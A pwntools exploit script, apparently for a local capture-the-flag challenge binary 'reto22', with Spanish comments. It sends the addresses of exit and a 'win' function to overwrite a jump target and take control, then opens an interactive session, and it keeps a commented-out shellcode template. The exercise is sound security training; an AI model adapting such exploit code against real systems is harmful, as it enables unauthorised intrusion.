#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /home/luciano/Descargas/reto22
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/home/luciano/Descargas/reto22')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      No RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x8048000)
# Stripped:   No

io = start()

# Busco la direccion de exit y la direccion de win
# La dirección de exit es 080498b0
exit_address = b'080498b0'
#target_address = int(exit_address, 16)

io.recvuntil(b"escribirlos?")

io.send(exit_address+b"\n")

linea = io.recvline()
print(linea)
# La direccion de win es 08048514
win_address = b'08048514'
#target_address_win= int(win_address, 16)

io.send(win_address+b"\n")
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

